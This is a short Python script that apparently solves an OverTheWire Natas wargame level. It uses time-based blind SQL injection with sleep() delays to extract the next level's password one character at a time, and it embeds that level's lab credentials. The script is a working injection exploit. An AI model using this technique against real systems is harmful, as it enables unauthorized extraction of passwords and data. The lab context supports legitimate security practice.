import requests

allchars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
parsedchars = ''
passwd = ''

target = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'


r = requests.get(target)
if r.status_code != requests.codes.ok:
	raise ValueError('Couldn\'t connect to target?......')
else:
	print('Target reachable....')


for c in allchars:
	try:
		r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "%'+c+'%", sleep(5), null) %23', timeout=1)
	except requests.exceptions.Timeout:
		parsedchars += c
		print('Used chars: ' + parsedchars)



print('Characters parsed. Starting Brute Force......')

for i in range(32):
	for c in parsedchars:
		try:
			r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "' + passwd + c + '%", sleep(5), null) %23', timeout=1)
		except requests.exceptions.Timeout:
			passwd += c
			print('Password: ' + passwd + '*' * int(32 - len(passwd)))
			break
